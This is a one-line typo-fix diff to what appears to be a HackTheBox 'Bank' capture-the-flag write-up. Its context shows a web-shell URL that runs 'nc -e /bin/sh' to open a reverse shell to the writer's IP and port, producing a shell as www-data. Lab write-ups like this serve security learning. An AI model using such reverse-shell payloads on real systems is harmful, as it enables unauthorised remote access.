@@ -185,7 +185,7 @@ This gives us the output that we are _www-data_. Lets start a reverse shell with
 http://bank.htb/uploads/logo.htb?cmd=nc%20-e%20/bin/sh%2010.10.14.23%209001
 ```
 
-After a short while the the request gets sent to my listener that waits for connections on my IP and port 9001 and started a reverse shell as www-data!
+After a short while the request gets sent to my listener that waits for connections on my IP and port 9001 and started a reverse shell as www-data!
 
 ## Privilege Escalation
 
